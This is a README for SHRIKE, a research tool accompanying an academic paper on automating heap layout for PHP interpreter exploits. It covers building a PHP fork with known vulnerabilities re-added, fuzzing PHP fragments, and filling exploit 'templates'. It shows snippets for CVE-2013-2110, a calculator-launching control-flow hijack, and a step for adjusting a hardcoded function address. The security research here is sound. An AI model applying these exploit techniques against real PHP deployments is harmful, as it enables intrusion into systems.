# Shrike

See the [associated paper][1].

## Install

### Python Dependencies

Python 3.6 or higher is required. Assuming you have it available as `python36`
on your system, the following will initialise the required virtual environment.

```
$ virtualenv --python36 shrike-venv
$ source shrike-venv/bin/activate
$ pip install -r requirements.txt
```

## Usage

### Dumping PHP's Tests

First we need to build our customised version of [PHP][2]. This is a modified
version of PHP 7.1.6. The primary modifications are the addition of a number of
vulnerabilities that were patched in previous versions, as well as an extension
which adds new functions to PHP required by Shrike. Namely, functions that can
record pointers and produce the distance between two recorded allocations.

```
$ git clone git@github.com:SeanHeelan/PHP-SHRIKE.git
$ cd PHP-SHRIKE
$ ./buildconf -f
$ ./configure --prefix=`pwd`/install --enable-shrike --enable-dve \
	--enable-mbstring --enable-intl --enable-exif --with-gd
$ make && make install
```

Now we need to extract the tests that come with PHP. These are standalone PHP
scripts that test functionality, regressions and so on.

```
$ cd PHP-SHRIKE
$ export TEST_PHP_EXECUTABLE=`pwd`/install/bin/php
$ ./install/bin/php ./run-tests.php -x --offline --keep-php \
	--temp-target phptests --temp-source `pwd`
$ # Clean up some files we don't need
$ find phptests/ -regex ".*\(phpt\|skip\).phps" | xargs rm
$ # This should leave just under 12k files
$ find phptests/ -name *.phps | wc -l
```

### Extracting Valid Fragments of PHP

Add the directory containing `shrike` to your Python path. Assuming you have
cloned the `HeapLayout` repository at `~/HeapLayout`, one way to do this is as
follows:

```
$ echo 'export PYTHONPATH=~/HeapLayout/Shrike:$PYTHONPATH' >> ~/.bashrc
$ source ~/.bashrc
```

We can then extract fragments of valid PHP from these tests as follows:

```
$ ./frag.py -o fragged.pkl -p PHP-SHRIKE/install/bin/php phptests/
INFO:__main__:Utilising 6 cores
INFO:__main__:Analysing the PHP binary at PHP-SHRIKE/install/bin/php
INFO:__main__:Processing tests from phptests/
INFO:shrike.php7:Processed 11878 files
INFO:shrike.php7:No results from 8757 files
INFO:shrike.php7:203 extracted functions
INFO:__main__:Extracting sequences from 1626 fragments
INFO:__main__:89/1626 tests contained fatal errors
INFO:__main__:1/1626 tests triggered OS errors
INFO:__main__:87/1626 tests contained disabled functions
INFO:__main__:959/1626 tests triggered no heap interaction
INFO:__main__:278 unique allocator interaction sequences out of 490 total
INFO:__main__:Logging sequences to fragged.pkl
```

### Fuzzing Fragments

From running the tests we have discovered nearly 300 interaction sequences with
heap allocator. We can find many more by fuzzing the existing fragments. Replace
the `N` in the command line with the number of seconds you wish to fuzz for.
With a single core you should give it 30 minutes (1800 seconds) or so. If you
have more cores available this can be reduced. The output shown is for 60
seconds with 6 cores.

```
$ ./fuzz.py -p PHP-SHRIKE/install/bin/php fragged.pkl -t 600
INFO:__main__:Utilising 6 cores
INFO:__main__:Analysing the PHP binary at PHP-SHRIKE/install/bin/php
INFO:__main__:278 unique sequences across 490 fragments loaded from fragged.pkl
INFO:shrike.php7:132500 total executions (220.83333333333334 per second)
INFO:shrike.php7:48325 duplicates discovered
INFO:shrike.php7:58307 errors
INFO:__main__:25868 new interaction sequence discovered
INFO:__main__:Writing fuzzing results to fuzzed_fragged.pkl
```

### Template-Based Exploit Development with SHRIKE

SHRIKE enables what I have taken to calling 'template-based exploit
development'. The concept is explained in a bit more detail in [this][3] blog
post. Essentially, the exploit developer writes their exploit as normal but
leaves 'holes' in the exploit where a heap layout problem needs to be solved.
SHRIKE then takes this 'template' and fills in the holes, such that the layout
desired by the exploit developer is achieved. It's obviously very early days
yet, and I have only implemented the concept for PHP, but I think it's a
promising direction for the addition of automation to exploitation.

The `solve.py` script is responsible for taking a template, as well as the PHP
fragments we discovered above, and trying to solve the layout problems embedded
in the template. The script operates by rewriting the templates to insert PHP
fragments and then handing them off to our custom version of PHP, which contains
helper functions for things like recording allocation addresses. It then
iterates this process until a solution is found.

Lets have a look at an example, which should hopefully clarify
things. For full details see section 3.2 of the paper.

In the `templates` directory you will find a number of templates, which are just
normal PHP scripts but with directives starting with `#X-SHRIKE`. These
directives are used to inform SHRIKE of the details of the layout problem to be
solved. For example, `templates/cve-2013-2110-hash_init.template.php` contains
the following lines:

```php
<?php

...

$quote_str = str_repeat("\xf4", 123);
#X-SHRIKE HEAP-MANIP 384 32
# Allocates a 32 byte buffer as its third allocation
#X-SHRIKE RECORD-ALLOC 2 1
$vtx_dst = hash_init("md5");
#X-SHRIKE HEAP-MANIP 384 32
#X-SHRIKE RECORD-ALLOC 0 2
quoted_printable_encode($quote_str);
#X-SHRIKE REQUIRE-DISTANCE 1 2 384

...
?>
```

The directives operate as follows (full details in section 3.2.3 of the paper):

* The `HEAP-MANIP` directive is followed by one or more integers, telling SHRIKE
  that at this point it should insert fragments that make allocations with size
  equal to one of these integers.

* The `RECORD-ALLOC` directive tells SHRIKE to insert a call to a function we
  have inserted into PHP that records the address of an allocation about to take
  place. `RECORD-ALLOC X Y` tells SHRIKE to record the Xth allocation and give
  it the ID Y. Allocation indices start from 0.

* The `REQUIRE-DISTANCE X Y Z` directive tells SHRIKE to insert code to check if
  the distance between allocation with ID X and the allocation with ID Y is
  equal to Z.

A template can contain as many `REQUIRE-DISTANCE` directives as you like. SHRIKE
will start from the first and solve them one after the other. In the above
template we have just a single such directive, requesting that SHRIKE find a way
to place the third allocation made by `hash_init` 384 bytes after the first
allocation made by `quoted_printable_encode`.

Solving this problem looks like the following:

```
$ ./solve.py -o /tmp/output -p /data/Documents/git/php-shrike/install/bin/php
	\ --template templates/cve-2013-2110-hash_init.template.php -t 3600
	\ fragged.pkl fuzzed_fragged.pkl
2018-10-11 18:12:40 INFO     Utilising 6 cores
2018-10-11 18:12:40 INFO     Analysing the PHP binary at PHP-SHRIKE/install/bin/php
2018-10-11 18:12:40 INFO     Template: templates/cve-2013-2110-hash_init.template.php
2018-10-11 18:12:40 INFO     Time limit: 3600
2018-10-11 18:12:40 INFO     26146 unique sequences across 26358 fragments loaded from ['fragged.pkl', 'fuzzed_fragged.pkl']
2018-10-11 18:12:40 INFO     Loaded template from templates/cve-2013-2110-hash_init.template.php
2018-10-11 18:12:40 INFO     Template contains 1 stages
2018-10-11 18:12:41 INFO     217 allocation sequences for size 384
2018-10-11 18:12:41 INFO     Shortest sequences for size 384 have length 1 (4 alternates)
2018-10-11 18:12:41 INFO     2071 allocation sequences for size 32
2018-10-11 18:12:41 INFO     Shortest sequences for size 32 have length 1 (17 alternates)
2018-10-11 18:12:41 INFO     Starting 6 workers
2018-10-11 18:12:41 INFO     Workers started
2018-10-11 18:12:43 INFO     Shortest distance is now None
2018-10-11 18:12:43 INFO     Shortest distance 19744. Run time 1.07s. 11.24 executions per second. 12 successful executions. 0 errors.
2018-10-11 18:12:45 INFO     Shortest distance is now 19744
2018-10-11 18:12:45 INFO     Shortest distance 19200. Run time 2.15s. 7.44 executions per second. 16 successful executions. 0 errors.
2018-10-11 18:12:46 INFO     Shortest distance 19200. Run time 3.33s. 13.21 executions per second. 44 successful executions. 0 errors.
2018-10-11 18:12:48 INFO     Shortest distance 19200. Run time 5.20s. 15.37 executions per second. 80 successful executions. 0 errors.

...

2018-10-11 18:14:05 INFO     Shortest distance 1152. Run time 82.87s. 72.76 executions per second. 6024 successful executions. 3 errors.
2018-10-11 18:14:15 INFO     Shortest distance 1152. Run time 92.88s. 74.15 executions per second. 6881 successful executions. 3 errors.
2018-10-11 18:14:18 INFO     Shortest distance is now 1152
2018-10-11 18:14:18 INFO     Discovered distance less than the cut off. Shutting down workers ...
2018-10-11 18:14:18 INFO     Shutdown notification sent. Waiting 30 seconds ...
2018-10-11 18:14:48 INFO     7515 successful executions. 3 errors.
2018-10-11 18:14:48 INFO     === Progress Report ===
2018-10-11 18:14:48 INFO     Time: 1, Distance: 19744, Executions: 0, Errors: 0
2018-10-11 18:14:48 INFO     Time: 2, Distance: 19200, Executions: 12, Errors: 0
2018-10-11 18:14:48 INFO     Time: 8, Distance: 15584, Executions: 93, Errors: 0
2018-10-11 18:14:48 INFO     Time: 12, Distance: 15360, Executions: 210, Errors: 0
2018-10-11 18:14:48 INFO     Time: 13, Distance: 7680, Executions: 210, Errors: 0
2018-10-11 18:14:48 INFO     Time: 19, Distance: 5568, Executions: 740, Errors: 0
2018-10-11 18:14:48 INFO     Time: 21, Distance: 1440, Executions: 793, Errors: 0
2018-10-11 18:14:48 INFO     Time: 82, Distance: 1152, Executions: 5927, Errors: 3
2018-10-11 18:14:48 INFO     Time: 95, Distance: 384, Executions: 6881, Errors: 3
2018-10-11 18:14:48 INFO     === End Progress Report ===
```

If we look in the output directory we will find the original template as well as
the final 'exploit' that has been modified to achieve the desired heap layout.

```
$ ls /tmp/output/
000000000000000000000000001_solution  cve-2013-2110-hash_init.template.php
$ wc -l /tmp/output/*
  1711 /tmp/output/000000000000000000000000001_solution
    22 /tmp/output/cve-2013-2110-hash_init.template.php
  1733 total
```

### Generating an Exploit for PHP

In the templates directory, the file `cve-2013-2110-exploit.template.php`
contains a template for an exploit for PHP. For a more detailed explanation see
[this][1] blog post. The vulnerability allows us to write a single NULL byte
immediately after a buffer allocated by `quoted_printable_encode`. The
exploitation strategy is to use this overflow to correct a pointer that
resides at the start of a `gdImage` structure allocated by `imagecreate`.

The beginning of the template encodes this required layout as follows:

```php
<?php
#X-SHRIKE TEMPLATE-VERSION 2

$quote_str = str_repeat("\xf4", 123);
#X-SHRIKE HEAP-MANIP 384
#X-SHRIKE RECORD-ALLOC 0 1
$image = imagecreate(1, 2);
#X-SHRIKE HEAP-MANIP 384
#X-SHRIKE RECORD-ALLOC 0 2
quoted_printable_encode($quote_str);

#X-SHRIKE REQUIRE-DISTANCE 1 2 384

...
```

Then the rest of the exploit proceeds, under the assumption that the correct
layout has been achieved. The template can be provided to the `solve.py` script
as before. When the discovered solution is run it should result in the hijacking
of the program's control flow and `gnome-calculator` will be executed. A demo of
this process can be seen [here][4]. There's no audio but the video description
describes what is going on.

If you want to generate the exploit for yourself you will need to modify a
hardcoded address that is found on line 97 of the template. (Or if you want you
can update the exploit to leak the address ;)). It looks as follows:

```php
$zend_eval_string_addr = 0x95fd61;
```

The address of `zend_eval_string` in your binary may differ. To find it run the
following:

```
readelf -s PHP-SHRIKE/install/bin/php | grep zend_eval_string
```

Make sure you take the address for the correct function as there are 3 variants
of it with slightly different names.


[1]: https://sean.heelan.io/heaplayout
[2]: https://github.com/SeanHeelan/PHP-SHRIKE
[3]: https://sean.heelan.io
[4]: https://www.youtube.com/watch?v=MOOvhckRoww
